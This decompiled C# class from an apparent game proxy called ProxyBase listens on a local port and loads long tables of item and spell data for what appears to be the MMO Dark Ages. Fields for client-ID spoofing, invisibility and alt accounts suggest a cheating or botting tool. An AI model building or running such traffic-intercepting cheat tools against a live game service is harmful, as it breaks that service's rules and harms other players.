// Decompiled with JetBrains decompiler
// Type: ProxyBase.Server
// Assembly: ProxyBase, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 077B98B9-686A-434C-992F-701D553EA96A
// Assembly location: C:\Users\snowi\Documents\projects\ProxyBase3-30-17\ProxyBase.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Linq;

namespace ProxyBase
{
  public class Server
  {
    public static List<AscendData> AscendLog = (List<AscendData>) null;
    public static string cID = "";
    public static string klName = "dogon";
    public static List<string> friendlist = (List<string>) null;
    public static List<string> gmlist = (List<string>) null;
    public static List<string> ignoreaislinglist = (List<string>) null;
    public static List<string> wsbanlist = (List<string>) null;
    public static List<int> CustomLoot = (List<int>) null;
    public static List<string> IdentifyItems = (List<string>) null;
    public static List<string> TrashList = (List<string>) null;
    public static List<string> NeedsIdentifiedList = (List<string>) null;
    public static bool SentryAlarm = false;
    public static bool alertfornonfriends = true;
    public static byte invis = 80;
    public static Thread StrajNpc = (Thread) null;
    public static List<string> entitynametesting = new List<string>();
    public static List<string> scriptTexts = new List<string>();
    public uint itemID = 0;
    public bool now = false;
    public uint ClientId1 = 0;
    public ushort ClientId2 = 0;
    public int SpoofClientId = 0;
    public static SoundPlayer alarm;
    public static DateTime alarmTimer;
    public static System.Timers.Timer AlertNonFriendTimer;

    public bool Running { get; private set; }

    public Socket Socket { get; private set; }

    public TcpListener Listener { get; private set; }

    public ClientMessageHandler[] ClientMessageHandlers { get; private set; }

    public ServerMessageHandler[] ServerMessageHandlers { get; private set; }

    public EndPoint RemoteEndPoint { get; private set; }

    public static List<Client> Clients { get; private set; }

    public Thread ServerLoopThread { get; private set; }

    public static Dictionary<string, ushort> Dialogs { get; set; }

    public static Dictionary<string, Parcel> ParcelList { get; set; }

    public static Dictionary<string, ChestItemXML> ChestDatabase { get; set; }

    public static Dictionary<string, ItemMapXML> ItemMapDatabase { get; set; }

    public static Dictionary<string, ItemXML> ItemDatabase { get; set; }

    public static Dictionary<string, ProxyBase.TimedEvent> TimedEvent { get; set; }

    public static Dictionary<string, ProxyBase.Relog> Relog { get; set; }

    public static Dictionary<string, Client> Alts { get; set; }

    public static Dictionary<string, string> Stuff { get; set; }

    public static Dictionary<string, int> DAServer { get; set; }

    public static Dictionary<string, bool> DARegged { get; set; }

    public static Dictionary<uint, Character> StaticCharacters { get; set; }

    public static Dictionary<string, SpellData> SpellList { get; set; }

    public static Dictionary<string, ItemData> ItemList { get; set; }

    public static Dictionary<string, HerbNode> HydeleNodes { get; set; }

    public static Dictionary<string, HerbNode> PersonacaNodes { get; set; }

    public static Dictionary<string, HerbNode> BetonyNodes { get; set; }

    public static Dictionary<string, HerbNode> HerbNodes { get; set; }

    public static Dictionary<string, SkullData> SkullList { get; set; }

    public static Dictionary<string, RootNpc> gamenpcs { get; set; }

    public static Dictionary<int, RootObject> gamemaps { get; set; }

    public static Thread TimedEvents { get; set; }

    public Server()
    {
      this.Listener = new TcpListener(IPAddress.Loopback, 2610);
      this.Listener.Start(10);
      Server.Clients = new List<Client>();
      Server.Dialogs = new Dictionary<string, ushort>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      this.LoadDialogList();
      Server.gamemaps = new Dictionary<int, RootObject>();
      this.Loadgamemaps();
      Server.gamenpcs = new Dictionary<string, RootNpc>();
      this.Loadgamenpcs();
      Server.ParcelList = new Dictionary<string, Parcel>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.ChestDatabase = new Dictionary<string, ChestItemXML>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.ChestDatabase.Add("Arcella's Gift1", new ChestItemXML("Arcella's Gift1", 0U));
      Server.ChestDatabase.Add("Water Dungeon Chest", new ChestItemXML("Water Dungeon Chest", 0U));
      Server.ChestDatabase.Add("Water Dungeon Chest Gold", new ChestItemXML("Water Dungeon Chest Gold", 0U));
      Server.ChestDatabase.Add("Andor Chest", new ChestItemXML("Andor Chest", 0U));
      Server.ChestDatabase.Add("Andor Chest Gold", new ChestItemXML("Andor Chest Gold", 0U));
      Server.ChestDatabase.Add("Queen's Chest", new ChestItemXML("Queen's Chest", 0U));
      Server.ChestDatabase.Add("Queen's Chest Gold", new ChestItemXML("Queen's Chest Gold", 0U));
      Server.ChestDatabase.Add("Canal Bag", new ChestItemXML("Canal Bag", 0U));
      Server.ChestDatabase.Add("Big Canal Bag", new ChestItemXML("Big Canal Bag", 0U));
      Server.ChestDatabase.Add("Heavy Canal Bag", new ChestItemXML("Heavy Canal Bag", 0U));
      this.PopulateChestDatabase();
      Server.ItemMapDatabase = new Dictionary<string, ItemMapXML>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.ItemDatabase = new Dictionary<string, ItemXML>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      this.PopulateItemDatabase();
      Server.BetonyNodes = new Dictionary<string, HerbNode>();
      Server.PersonacaNodes = new Dictionary<string, HerbNode>();
      Server.HydeleNodes = new Dictionary<string, HerbNode>();
      Server.HerbNodes = new Dictionary<string, HerbNode>();
      this.PopulateNodes();
      Server.AscendLog = new List<AscendData>();
      Server.SkullList = new Dictionary<string, SkullData>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.TimedEvent = new Dictionary<string, ProxyBase.TimedEvent>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.Relog = new Dictionary<string, ProxyBase.Relog>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.Alts = new Dictionary<string, Client>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.Stuff = new Dictionary<string, string>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.DAServer = new Dictionary<string, int>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.DARegged = new Dictionary<string, bool>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.ItemList = new Dictionary<string, ItemData>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.ItemList.Add("purple potion", new ItemData("purple potion", 30));
      Server.ItemList.Add("fior athar", new ItemData("fior athar", 100));
      Server.ItemList.Add("fior sal", new ItemData("fior sal", 100));
      Server.ItemList.Add("fior srad", new ItemData("fior srad", 100));
      Server.ItemList.Add("fior creag", new ItemData("fior creag", 100));
      Server.ItemList.Add("borim", new ItemData("borim", 100));
      Server.ItemList.Add("pantica", new ItemData("pantica", 100));
      Server.ItemList.Add("tentacle", new ItemData("tentacle", 30));
      Server.ItemList.Add("red tentacle", new ItemData("red tentacle", 30));
      Server.ItemList.Add("rambutan", new ItemData("rambutan", 30));
      Server.ItemList.Add("papaya", new ItemData("papaya", 30));
      Server.ItemList.Add("tangerines", new ItemData("tangerines", 30));
      Server.ItemList.Add("green grapes", new ItemData("green grapes", 30));
      Server.ItemList.Add("komadium", new ItemData("komadium", 52));
      Server.ItemList.Add("beothaich deum", new ItemData("beothaich deum", 25));
      Server.ItemList.Add("personaca deum", new ItemData("personaca deum", 25));
      Server.ItemList.Add("betony deum", new ItemData("betony deum", 25));
      Server.ItemList.Add("hydele deum", new ItemData("hydele deum", 25));
      Server.ItemList.Add("brown potion", new ItemData("brown potion", 25));
      Server.ItemList.Add("hemloch", new ItemData("hemloch", 30));
      Server.ItemList.Add("hemloch deum", new ItemData("hemloch deum", 25));
      Server.ItemList.Add("satchel of hemloch", new ItemData("satchel of hemloch", 150));
      Server.ItemList.Add("red spore", new ItemData("red spore", 50));
      Server.ItemList.Add("grey spore", new ItemData("grey spore", 50));
      Server.ItemList.Add("blue frog meat", new ItemData("blue frog meat", 50));
      Server.ItemList.Add("red frog meat", new ItemData("red frog meat", 50));
      Server.ItemList.Add("grey frog meat", new ItemData("grey frog meat", 50));
      Server.ItemList.Add("ginseng", new ItemData("ginseng", 5));
      Server.ItemList.Add("gold mushroom", new ItemData("gold mushroom", 5));
      Server.ItemList.Add("aqua stone", new ItemData("aqua stone", 200));
      Server.ItemList.Add("wind stone", new ItemData("wind stone", 200));
      Server.ItemList.Add("green tonic", new ItemData("green tonic", 50));
      Server.ItemList.Add("green hitonic", new ItemData("green hitonic", 50));
      Server.ItemList.Add("green extonic", new ItemData("green extonic", 50));
      Server.ItemList.Add("red tonic", new ItemData("red tonic", 100));
      Server.ItemList.Add("red hitonic", new ItemData("red hitonic", 100));
      Server.ItemList.Add("red extonic", new ItemData("red extonic", 100));
      Server.ItemList.Add("blue tonic", new ItemData("blue tonic", 30));
      Server.ItemList.Add("blue hitonic", new ItemData("blue hitonic", 10));
      Server.ItemList.Add("blue extonic", new ItemData("blue extonic", 20));
      Server.ItemList.Add("scrap of clothing", new ItemData("scrap of clothing", 50));
      Server.ItemList.Add("fire arrow", new ItemData("fire arrow", 200));
      Server.ItemList.Add("veltain ore", new ItemData("veltain ore", 100));
      Server.ItemList.Add("empty ice bottle", new ItemData("empty ice bottle", 100));
      Server.ItemList.Add("ice bottle", new ItemData("ice bottle", 100));
      Server.ItemList.Add("assassin wolf locks", new ItemData("assassin wolf locks", 100));
      Server.ItemList.Add("crystal bar", new ItemData("crystal bar", 50));
      Server.ItemList.Add("crystal orb", new ItemData("crystal orb", 100));
      Server.ItemList.Add("dendron flower", new ItemData("dendron flower", 100));
      Server.ItemList.Add("yowien fish", new ItemData("yowien fish", 30));
      Server.ItemList.Add("stunned fire worm", new ItemData("stunned fire worm", 100));
      Server.ItemList.Add("yowien blue vine", new ItemData("yowien blue vine", 1000));
      Server.ItemList.Add("yowien yellow vine", new ItemData("yowien yellow vine", 1000));
      Server.SpellList = new Dictionary<string, SpellData>((IEqualityComparer<string>) StringComparer.CurrentCultureIgnoreCase);
      Server.SpellList.Add("Leafhopper Chirp", new SpellData("Leafhopper Chirp", 50, 0));
      Server.SpellList.Add("Dragon Blast", new SpellData("Dragon Blast", 18000, 4));
      Server.SpellList.Add("Deception of Life", new SpellData("Deception of Life", 18000, 4));
      Server.SpellList.Add("dachaidh", new SpellData("dachaidh", 50, 2));
      Server.SpellList.Add("mor dion comlha", new SpellData("mor dion comlha", 300, 4));
      Server.SpellList.Add("mor dion", new SpellData("mor dion", 1000, 2));
      Server.SpellList.Add("Stone Skin", new SpellData("Stone Skin", 1200, 0));
      Server.SpellList.Add("deireas faileas", new SpellData("deireas faileas", 980, 3));
      Server.SpellList.Add("mor deo searg gar", new SpellData("mor deo searg gar", 12000, 2));
      Server.SpellList.Add("deo searg gar", new SpellData("deo searg gar", 8000, 2));
      Server.SpellList.Add("ard deo searg", new SpellData("ard deo searg", 3000, 2));
      Server.SpellList.Add("deo searg", new SpellData("deo searg", 1900, 4));
      Server.SpellList.Add("deo saighead", new SpellData("deo saighead", 320, 2));
      Server.SpellList.Add("deo lamh", new SpellData("deo lamh", 320, 1));
      Server.SpellList.Add("ard cradh", new SpellData("ard cradh", 500, 3));
      Server.SpellList.Add("mor cradh", new SpellData("mor cradh", 120, 3));
      Server.SpellList.Add("cradh", new SpellData("cradh", 90, 3));
      Server.SpellList.Add("beag cradh", new SpellData("beag cradh", 60, 2));
      Server.SpellList.Add("ao dall", new SpellData("ao dall", 30, 1));
      Server.SpellList.Add("ao puinsein", new SpellData("ao puinsein", 30, 1));
      Server.SpellList.Add("ao suain", new SpellData("ao suain", 30, 1));
      Server.SpellList.Add("ao ard cradh", new SpellData("ao ard cradh", 120, 1));
      Server.SpellList.Add("ao mor cradh", new SpellData("ao mor cradh", 90, 1));
      Server.SpellList.Add("ao cradh", new SpellData("ao cradh", 60, 1));
      Server.SpellList.Add("ao beag cradh", new SpellData("ao beag cradh", 30, 1));
      Server.SpellList.Add("beag breisleich", new SpellData("beag breisleich", 110, 1));
      Server.SpellList.Add("breisleich", new SpellData("breisleich", 110, 1));
      Server.SpellList.Add("mor breisleich", new SpellData("mor breisleich", 110, 1));
      Server.SpellList.Add("beag puinsein", new SpellData("beag puinsein", 100, 4));
      Server.SpellList.Add("puinsein", new SpellData("puinsein", 300, 3));
      Server.SpellList.Add("beag pramh", new SpellData("beag pramh", 300, 4));
      Server.SpellList.Add("pramh", new SpellData("pramh", 300, 4));
      Server.SpellList.Add("suain", new SpellData("suain", 330, 4));
      Server.SpellList.Add("dall", new SpellData("dall", 330, 4));
      Server.SpellList.Add("beag naomh aite", new SpellData("beag naomh aite", 30, 3));
      Server.SpellList.Add("naomh aite", new SpellData("naomh aite", 30, 2));
      Server.SpellList.Add("mor naomh aite", new SpellData("mor naomh aite", 200, 4));
      Server.SpellList.Add("ard naomh aite", new SpellData("ard naomh aite", 600, 4));
      Server.SpellList.Add("ard ioc comlha", new SpellData("ard ioc comlha", 2000, 2));
      Server.SpellList.Add("mor ioc comlha", new SpellData("mor ioc comlha", 1100, 2));
      Server.SpellList.Add("ioc comlha", new SpellData("ioc comlha", 450, 2));
      Server.SpellList.Add("beag ioc comlha", new SpellData("beag ioc comlha", 70, 1));
      Server.SpellList.Add("nuadhaich", new SpellData("nuadhaich", 1260, 2));
      Server.SpellList.Add("ard ioc", new SpellData("ard ioc", 800, 2));
      Server.SpellList.Add("mor ioc", new SpellData("mor ioc", 600, 2));
      Server.SpellList.Add("ioc", new SpellData("ioc", 200, 1));
      Server.SpellList.Add("beag ioc", new SpellData("beag ioc", 30, 1));
      Server.SpellList.Add("creag neart", new SpellData("creag neart", 30, 0));
      Server.SpellList.Add("fas deireas", new SpellData("fas deireas", 30, 1));
      Server.SpellList.Add("beannaich", new SpellData("beannaich", 30, 1));
      Server.SpellList.Add("mor beannaich", new SpellData("mor beannaich", 90, 2));
      Server.SpellList.Add("armachd", new SpellData("armachd", 30, 2));
      Server.SpellList.Add("Dark Seal", new SpellData("Dark Seal", 350, 6));
      Server.SpellList.Add("Darker Seal", new SpellData("Darker Seal", 450, 6));
      Server.SpellList.Add("Demise", new SpellData("Demise", 500, 6));
      Server.SpellList.Add("Mesmerize", new SpellData("Mesmerize", 800, 7));
      Server.SpellList.Add("Cursed Tune 9", new SpellData("Cursed Tune 9", 3960, 0));
      Server.SpellList.Add("Cursed Tune 8", new SpellData("Cursed Tune 8", 3960, 0));
      Server.SpellList.Add("Cursed Tune 7", new SpellData("Cursed Tune 7", 3960, 0));
      Server.SpellList.Add("Cursed Tune 6", new SpellData("Cursed Tune 6", 3960, 0));
      Server.SpellList.Add("Cursed Tune 5", new SpellData("Cursed Tune 5", 3960, 0));
      Server.SpellList.Add("Cursed Tune 4", new SpellData("Cursed Tune 4", 3960, 0));
      Server.SpellList.Add("Cursed Tune 3", new SpellData("Cursed Tune 3", 3960, 0));
      Server.SpellList.Add("Cursed Tune 2", new SpellData("Cursed Tune 2", 3960, 0));
      Server.SpellList.Add("Cursed Tune 1", new SpellData("Cursed Tune 1", 3960, 0));
      Server.SpellList.Add("puinneag spiorad", new SpellData("puinneag spiorad", 350, 2));
      Server.SpellList.Add("Regeneration 8", new SpellData("Regeneration 8", 2720, 2));
      Server.SpellList.Add("Regeneration 7", new SpellData("Regeneration 7", 2720, 2));
      Server.SpellList.Add("Regeneration 6", new SpellData("Regeneration 6", 2720, 2));
      Server.SpellList.Add("Regeneration 5", new SpellData("Regeneration 5", 2720, 2));
      Server.SpellList.Add("Regeneration 4", new SpellData("Regeneration 4", 2720, 2));
      Server.SpellList.Add("Regeneration 3", new SpellData("Regeneration 3", 2720, 2));
      Server.SpellList.Add("Regeneration 2", new SpellData("Regeneration 2", 2720, 2));
      Server.SpellList.Add("Regeneration 1", new SpellData("Regeneration 1", 1220, 2));
      Server.SpellList.Add("Counter Attack 8", new SpellData("Counter Attack 8", 3400, 2));
      Server.SpellList.Add("Counter Attack 7", new SpellData("Counter Attack 7", 3400, 2));
      Server.SpellList.Add("Counter Attack 6", new SpellData("Counter Attack 6", 3400, 2));
      Server.SpellList.Add("Counter Attack 5", new SpellData("Counter Attack 5", 3400, 2));
      Server.SpellList.Add("Counter Attack 4", new SpellData("Counter Attack 4", 2720, 2));
      Server.SpellList.Add("Counter Attack 3", new SpellData("Counter Attack 3", 2720, 2));
      Server.SpellList.Add("Counter Attack 2", new SpellData("Counter Attack 2", 2720, 2));
      Server.SpellList.Add("Counter Attack 1", new SpellData("Counter Attack 1", 2720, 2));
      Server.SpellList.Add("Reflection", new SpellData("Reflection", 1080, 8));
      Server.SpellList.Add("Increased Regeneration", new SpellData("Increased Regeneration", 5100, 5));
      Server.SpellList.Add("srad gar", new SpellData("srad gar", 8160, 4));
      Server.SpellList.Add("sal gar", new SpellData("sal gar", 8160, 4));
      Server.SpellList.Add("creag gar", new SpellData("creag gar", 8160, 4));
      Server.SpellList.Add("athar gar", new SpellData("athar gar", 8160, 4));
      Server.SpellList.Add("ard srad", new SpellData("ard srad", 2530, 4));
      Server.SpellList.Add("ard sal", new SpellData("ard sal", 2530, 4));
      Server.SpellList.Add("ard creag", new SpellData("ard creag", 2530, 4));
      Server.SpellList.Add("ard athar", new SpellData("ard athar", 2530, 4));
      Server.SpellList.Add("srad meall", new SpellData("srad meall", 2400, 4));
      Server.SpellList.Add("sal meall", new SpellData("sal meall", 2400, 4));
      Server.SpellList.Add("creag meall", new SpellData("creag meall", 2400, 4));
      Server.SpellList.Add("athar meall", new SpellData("athar meall", 2400, 4));
      Server.SpellList.Add("mor srad", new SpellData("mor srad", 800, 4));
      Server.SpellList.Add("mor sal", new SpellData("mor sal", 800, 4));
      Server.SpellList.Add("mor creag", new SpellData("mor creag", 800, 4));
      Server.SpellList.Add("mor athar", new SpellData("mor athar", 800, 4));
      Server.SpellList.Add("srad lamh", new SpellData("srad lamh", 320, 1));
      Server.SpellList.Add("sal lamh", new SpellData("sal lamh", 320, 1));
      Server.SpellList.Add("creag lamh", new SpellData("creag lamh", 320, 1));
      Server.SpellList.Add("athar lamh", new SpellData("athar lamh", 320, 1));
      Server.SpellList.Add("srad", new SpellData("srad", 200, 2));
      Server.SpellList.Add("sal", new SpellData("sal", 200, 2));
      Server.SpellList.Add("creag", new SpellData("creag", 200, 2));
      Server.SpellList.Add("athar", new SpellData("athar", 200, 2));
      Server.SpellList.Add("beag srad lamh", new SpellData("beag srad lamh", 30, 2));
      Server.SpellList.Add("beag sal lamh", new SpellData("beag sal lamh", 30, 2));
      Server.SpellList.Add("beag creag lamh", new SpellData("beag creag lamh", 30, 2));
      Server.SpellList.Add("beag athar lamh", new SpellData("beag athar lamh", 30, 2));
      Server.SpellList.Add("beag srad", new SpellData("beag srad", 20, 2));
      Server.SpellList.Add("beag sal", new SpellData("beag sal", 20, 2));
      Server.SpellList.Add("beag creag", new SpellData("beag creag", 20, 2));
      Server.SpellList.Add("beag athar", new SpellData("beag athar", 20, 2));
      Server.SpellList.Add("Unholy Explosion", new SpellData("Unholy Explosion", 5500, 2));
      Server.SpellList.Add("mor strioch pian gar", new SpellData("mor strioch pian gar", 500, 1));
      Server.SpellList.Add("mor strioch bais", new SpellData("mor strioch bais", 500, 4));
      Server.SpellList.Add("pian na dion", new SpellData("pian na dion", 1500, 1));
      Server.SpellList.Add("mor pian na dion", new SpellData("mor pian na dion", 3000, 1));
      Server.SpellList.Add("ard pian na dion", new SpellData("ard pian na dion", 3000, 2));
      Server.SpellList.Add("Wings of Protection", new SpellData("Wings of Protection", 900, 0));
      Server.SpellList.Add("Lyliac Plant", new SpellData("Lyliac Plant", 1000, 0));
      Server.SpellList.Add("Lyliac Vineyard", new SpellData("Lyliac Vineyard", 200, 0));
      Server.SpellList.Add("beag puinneag spiorad", new SpellData("beag puinneag spiorad", 5, 0));
      Server.SpellList.Add("mor puinneag spiorad", new SpellData("mor puinneag spiorad", 5, 0));
      Server.SpellList.Add("ard puinneag spiorad", new SpellData("ard puinneag spiorad", 5, 0));
      Server.SpellList.Add("fas spiorad", new SpellData("fas spiorad", 0, 8));
      Server.SpellList.Add("beag fas nadur", new SpellData("beag fas nadur", 35, 2));
      Server.SpellList.Add("fas nadur", new SpellData("fas nadur", 35, 2));
      Server.SpellList.Add("mor fas nadur", new SpellData("mor fas nadur", 150, 4));
      Server.SpellList.Add("ard fas nadur", new SpellData("ard fas nadur", 1000, 8));
      Server.SpellList.Add("Disenchanter", new SpellData("Disenchanter", 3000, 4));
      Server.SpellList.Add("Bubble Block", new SpellData("Bubble Block", 700, 0));
      Server.SpellList.Add("Mud Wall", new SpellData("Mud Wall", 700, 0));
      Server.SpellList.Add("Cyclone", new SpellData("Cyclone", 1200, 0));
      Server.SpellList.Add("Fiery Defender", new SpellData("Fiery Defender", 3000, 4));
      Server.SpellList.Add("Keeter 14", new SpellData("Keeter 14", 2800, 2));
      Server.SpellList.Add("Keeter 13", new SpellData("Keeter 13", 2800, 2));
      Server.SpellList.Add("Keeter 12", new SpellData("Keeter 12", 2800, 2));
      Server.SpellList.Add("Keeter 11", new SpellData("Keeter 11", 2800, 2));
      Server.SpellList.Add("Keeter 10", new SpellData("Keeter 10", 2800, 2));
      Server.SpellList.Add("Keeter 9", new SpellData("Keeter 9", 2800, 2));
      Server.SpellList.Add("Keeter 8", new SpellData("Keeter 8", 2800, 2));
      Server.SpellList.Add("Keeter 7", new SpellData("Keeter 7", 2800, 2));
      Server.SpellList.Add("Keeter 6", new SpellData("Keeter 6", 2800, 2));
      Server.SpellList.Add("Keeter 5", new SpellData("Keeter 5", 2800, 2));
      Server.SpellList.Add("Keeter 4", new SpellData("Keeter 4", 2800, 2));
      Server.SpellList.Add("Keeter 3", new SpellData("Keeter 3", 2800, 2));
      Server.SpellList.Add("Keeter 2", new SpellData("Keeter 2", 2800, 2));
      Server.SpellList.Add("Keeter 1", new SpellData("Keeter 1", 2800, 2));
            Server.SpellList.Add("Groo 14", new SpellData("Groo 14", 2800, 2));
            Server.SpellList.Add("Groo 13", new SpellData("Groo 13", 2800, 2));
            Server.SpellList.Add("Groo 12", new SpellData("Groo 12", 2800, 2));
      Server.SpellList.Add("Groo 11", new SpellData("Groo 11", 2800, 2));
      Server.SpellList.Add("Groo 10", new SpellData("Groo 10", 2800, 2));
      Server.SpellList.Add("Groo 9", new SpellData("Groo 9", 2800, 2));
      Server.SpellList.Add("Groo 8", new SpellData("Groo 8", 2800, 2));
      Server.SpellList.Add("Groo 7", new SpellData("Groo 7", 2800, 2));
      Server.SpellList.Add("Groo 6", new SpellData("Groo 6", 2800, 2));
      Server.SpellList.Add("Groo 5", new SpellData("Groo 5", 2800, 2));
      Server.SpellList.Add("Groo 4", new SpellData("Groo 4", 2800, 2));
      Server.SpellList.Add("Groo 3", new SpellData("Groo 3", 2800, 2));
      Server.SpellList.Add("Groo 2", new SpellData("Groo 2", 2800, 2));
      Server.SpellList.Add("Groo 1", new SpellData("Groo 1", 2800, 2));
            Server.SpellList.Add("Mermaid 14", new SpellData("Mermaid 14", 2800, 2));
            Server.SpellList.Add("Mermaid 13", new SpellData("Mermaid 13", 2800, 2));
            Server.SpellList.Add("Mermaid 12", new SpellData("Mermaid 12", 2800, 2));
      Server.SpellList.Add("Mermaid 11", new SpellData("Mermaid 11", 2800, 2));
      Server.SpellList.Add("Mermaid 10", new SpellData("Mermaid 10", 2800, 2));
      Server.SpellList.Add("Mermaid 9", new SpellData("Mermaid 9", 2800, 2));
      Server.SpellList.Add("Mermaid 8", new SpellData("Mermaid 8", 2800, 2));
      Server.SpellList.Add("Mermaid 7", new SpellData("Mermaid 7", 2800, 2));
      Server.SpellList.Add("Mermaid 6", new SpellData("Mermaid 6", 2800, 2));
      Server.SpellList.Add("Mermaid 5", new SpellData("Mermaid 5", 2800, 2));
      Server.SpellList.Add("Mermaid 4", new SpellData("Mermaid 4", 2800, 2));
      Server.SpellList.Add("Mermaid 3", new SpellData("Mermaid 3", 2800, 2));
      Server.SpellList.Add("Mermaid 2", new SpellData("Mermaid 2", 2800, 2));
      Server.SpellList.Add("Mermaid 1", new SpellData("Mermaid 1", 2800, 2));
      Server.SpellList.Add("Torch 14", new SpellData("Torch 14", 2800, 2));
      Server.SpellList.Add("Torch 13", new SpellData("Torch 13", 2800, 2));
      Server.SpellList.Add("Torch 12", new SpellData("Torch 12", 2800, 2));
      Server.SpellList.Add("Torch 11", new SpellData("Torch 11", 2800, 2));
      Server.SpellList.Add("Torch 10", new SpellData("Torch 10", 2800, 2));
      Server.SpellList.Add("Torch 9", new SpellData("Torch 9", 2800, 2));
      Server.SpellList.Add("Torch 8", new SpellData("Torch 8", 2800, 2));
      Server.SpellList.Add("Torch 7", new SpellData("Torch 7", 2800, 2));
      Server.SpellList.Add("Torch 6", new SpellData("Torch 6", 2800, 2));
      Server.SpellList.Add("Torch 5", new SpellData("Torch 5", 2800, 2));
      Server.SpellList.Add("Torch 4", new SpellData("Torch 4", 2800, 2));
      Server.SpellList.Add("Torch 3", new SpellData("Torch 3", 2800, 2));
      Server.SpellList.Add("Torch 2", new SpellData("Torch 2", 2800, 2));
      Server.SpellList.Add("Torch 1", new SpellData("Torch 1", 2800, 2));
      Server.SpellList.Add("Gentle Touch", new SpellData("Gentle Touch", 360, 1));
      Server.SpellList.Add("Mist", new SpellData("Mist", 60, 0));
      Server.SpellList.Add("dion", new SpellData("dion", 600, 0));
      Server.SpellList.Add("Howl", new SpellData("Howl", 360, 1));
      Server.SpellList.Add("Wraith's Touch", new SpellData("Wraith's Touch", 1420, 4));
      Server.SpellList.Add("Komodas Form", new SpellData("Komodas Form", 360, 0));
      Server.SpellList.Add("Wild Komodas Form", new SpellData("Wild Komodas Form", 360, 0));
      Server.SpellList.Add("Fierce Komodas Form", new SpellData("Fierce Komodas Form", 360, 0));
      Server.SpellList.Add("Master Komodas Form", new SpellData("Master Komodas Form", 360, 0));
      Server.SpellList.Add("Feral Form", new SpellData("Feral Form", 360, 0));
      Server.SpellList.Add("Wild Feral Form", new SpellData("Wild Feral Form", 360, 0));
      Server.SpellList.Add("Fierce Feral Form", new SpellData("Fierce Feral Form", 360, 0));
      Server.SpellList.Add("Master Feral Form", new SpellData("Master Feral Form", 360, 0));
      Server.SpellList.Add("Karura Form", new SpellData("Karura Form", 360, 0));
      Server.SpellList.Add("Wild Karura Form", new SpellData("Wild Karura Form", 360, 0));
      Server.SpellList.Add("Fierce Karura Form", new SpellData("Fierce Karura Form", 360, 0));
      Server.SpellList.Add("Master Karura Form", new SpellData("Master Karura Form", 360, 0));
      Server.SpellList.Add("Cold Blood", new SpellData("Cold Blood", 1420, 1));
      Server.SpellList.Add("Hail of Feathers 1", new SpellData("Hail of Feathers 1", 1420, 0));
      Server.SpellList.Add("Hail of Feathers 2", new SpellData("Hail of Feathers 2", 760, 0));
      Server.SpellList.Add("Hail of Feathers 3", new SpellData("Hail of Feathers 3", 760, 0));
      Server.SpellList.Add("Hail of Feathers 4", new SpellData("Hail of Feathers 4", 1420, 0));
      Server.SpellList.Add("Hail of Feathers 5", new SpellData("Hail of Feathers 5", 1420, 0));
      Server.SpellList.Add("Hail of Feathers 6", new SpellData("Hail of Feathers 6", 1420, 0));
      Server.SpellList.Add("Hail of Feathers 7", new SpellData("Hail of Feathers 7", 1420, 0));
      Server.SpellList.Add("Hail of Feathers 8", new SpellData("Hail of Feathers 8", 1420, 0));
      Server.SpellList.Add("Hail of Feathers 9", new SpellData("Hail of Feathers 9", 1420, 0));
      Server.SpellList.Add("White Bat Stance", new SpellData("White Bat Stance", 25, 0));
      Server.SpellList.Add("Draco Stance", new SpellData("Draco Stance", 200, 0));
      Server.SpellList.Add("Iron Skin", new SpellData("Iron Skin", 250, 2));
      Server.SpellList.Add("asgall faileas", new SpellData("asgall faileas", 310, 1));
      Server.SpellList.Add("Aegis Sphere", new SpellData("Aegis Sphere", 5000, 0));
      Server.SpellList.Add("Gem Polishing", new SpellData("Gem Polishing", 20, 2));
      Server.SpellList.Add("Hide", new SpellData("Hide", 200, 0));
      Server.SpellList.Add("Shock Arrow", new SpellData("Shock Arrow", 1000, 0));
      Server.SpellList.Add("Life Arrow", new SpellData("Life Arrow", 1500, 0));
      Server.SpellList.Add("Star Arrow 10", new SpellData("Star Arrow 10", 1360, 0)); //1360 original bit
      Server.SpellList.Add("Star Arrow 9", new SpellData("Star Arrow 9", 775, 0));
      Server.SpellList.Add("Star Arrow 8", new SpellData("Star Arrow 8", 775, 0));
      Server.SpellList.Add("Star Arrow 7", new SpellData("Star Arrow 7", 775, 0));
      Server.SpellList.Add("Star Arrow 6", new SpellData("Star Arrow 6", 775, 0));
      Server.SpellList.Add("Star Arrow 5", new SpellData("Star Arrow 5", 475, 0));
      Server.SpellList.Add("Star Arrow 4", new SpellData("Star Arrow 4", 475, 0));
      Server.SpellList.Add("Star Arrow 3", new SpellData("Star Arrow 3", 475, 0));
      Server.SpellList.Add("Star Arrow 2", new SpellData("Star Arrow 2", 475, 0));
      Server.SpellList.Add("Star Arrow 1", new SpellData("Star Arrow 1", 400, 0));
      Server.SpellList.Add("Frost Arrow 8", new SpellData("Frost Arrow 8", 800, 1));
      Server.SpellList.Add("Frost Arrow 7", new SpellData("Frost Arrow 7", 800, 1));
      Server.SpellList.Add("Frost Arrow 6", new SpellData("Frost Arrow 6", 800, 1));
      Server.SpellList.Add("Frost Arrow 5", new SpellData("Frost Arrow 5", 800, 1));
      Server.SpellList.Add("Frost Arrow 4", new SpellData("Frost Arrow 4", 800, 1));
      Server.SpellList.Add("Frost Arrow 3", new SpellData("Frost Arrow 3", 800, 1));
      Server.SpellList.Add("Frost Arrow 2", new SpellData("Frost Arrow 2", 700, 1));
